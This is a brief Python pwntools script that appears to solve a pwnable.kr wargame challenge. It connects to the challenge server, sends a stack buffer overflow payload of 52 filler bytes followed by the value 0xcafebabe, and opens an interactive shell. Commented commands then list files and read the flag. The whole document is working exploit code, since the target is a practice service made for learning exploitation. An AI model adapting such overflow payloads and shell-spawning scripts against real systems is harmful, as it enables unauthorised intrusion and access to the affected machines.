from pwn import *

def main () :
	HOST = "pwnable.kr"
	PORT = 9000
	r = remote (HOST, PORT)

	payload = "A" * 52
	payload += "\xbe\xba\xfe\xca"
	payload += '\n'

	r.send (payload)
	r.interactive()
	# ls
	# cat flag

if __name__ == "__main__" :
	main ()
